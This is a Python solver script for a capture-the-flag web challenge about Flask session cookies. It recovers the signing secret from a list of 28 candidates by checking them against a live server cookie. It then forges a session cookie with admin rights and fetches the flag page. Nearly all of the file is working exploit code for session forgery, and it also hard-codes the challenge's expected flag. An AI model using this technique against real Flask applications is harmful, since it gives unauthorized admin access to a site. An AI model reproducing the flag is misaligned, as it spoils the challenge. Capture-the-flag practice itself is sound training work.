#!/usr/bin/env python3
"""Solver for Challenge 177 Most Cookies (picoCTF 2021, Web Exploitation).

Flask session cookies are HMAC-SHA1 signed with app.secret_key, chosen
by random.choice() from 28 hard-coded cookie names in server.py.
Signature scheme (itsdangerous, default Flask settings):
  derived = HMAC-SHA1(key=secret, msg=b'cookie-session')
  cookie  = b64(payload) + '.' + b64(timestamp) + '.' + b64(HMAC-SHA1(derived, payload_b64 + '.' + ts_b64))
Attack: fetch a live server-signed cookie for {"very_auth":"blank"},
verify which of the 28 candidate secrets reproduces the signature
(SECRET = "wafer"), then forge {"very_auth":"admin"} with a fresh
signature and GET /display to recover the flag.

Usage: solve_177_most_cookies.py [host] [port]
Verified: academy{cO0ki3s_yum_7ea44b33} (POST /api/submissions/ -> correct:true)
"""
import base64
import hashlib
import hmac
import json
import re
import socket
import sys

HOST = "chatelaine.cylabacademy.net"
PORT = 11042
COOKIE_NAMES = ["snickerdoodle", "chocolate chip", "oatmeal raisin",
                "gingersnap", "shortbread", "peanut butter", "whoopie pie",
                "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
                "snowball", "drop", "thumbprint", "pinwheel", "wafer",
                "macaroon", "fortune", "crinkle", "icebox", "gingerbread",
                "tassie", "lebkuchen", "macaron", "black and white",
                "white chocolate macadamia"]
SALT = b"cookie-session"
EXPECTED = "academy{cO0ki3s_yum_7ea44b33}"
FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def derive(secret: str) -> bytes:
    return hmac.new(secret.encode(), SALT, hashlib.sha1).digest()


def sign(derived: bytes, value: str) -> str:
    return b64e(hmac.new(derived, value.encode(), hashlib.sha1).digest())


def raw_get(path: str, host: str, port: int, cookie=None):
    s = socket.create_connection((host, int(port)), timeout=15)
    try:
        h = "GET %s HTTP/1.0\r\nHost: x\r\nUser-Agent: Mozilla/5.0\r\n" % path
        if cookie:
            h += "Cookie: session=" + cookie + "\r\n"
        s.sendall((h + "\r\n").encode())
        data = b""
        while True:
            ch = s.recv(4096)
            if not ch:
                break
            data += ch
    finally:
        s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    return head.decode(errors="replace"), body.decode(errors="replace")


def solve(host: str = HOST, port: int = PORT) -> str:
    head, _ = raw_get("/", host, port)
    sc = next((l for l in head.split("\r\n")
               if l.lower().startswith("set-cookie:")), "")
    live = sc.split("session=")[1].split(";")[0]
    p1, p2, _ = live.split(".")
    val = p1 + "." + p2
    secret = None
    for name in COOKIE_NAMES:
        if sign(derive(name), val) == live.split(".")[2]:
            secret = name
            break
    if secret is None:
        raise ValueError("no candidate secret matched live cookie")
    print("[*] recovered Flask secret_key: %r" % secret)
    admin_p = b64e(json.dumps({"very_auth": "admin"},
                              separators=(",", ":")).encode())
    admin_val = admin_p + "." + p2
    admin_ck = admin_val + "." + sign(derive(secret), admin_val)
    _, body = raw_get("/display", host, port, admin_ck)
    m = FLAG_RE.search(body)
    if not m:
        raise ValueError("flag not in /display response")
    flag = m.group(0)
    print("flag:", flag)
    assert flag == EXPECTED, flag
    return flag


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(host, port))
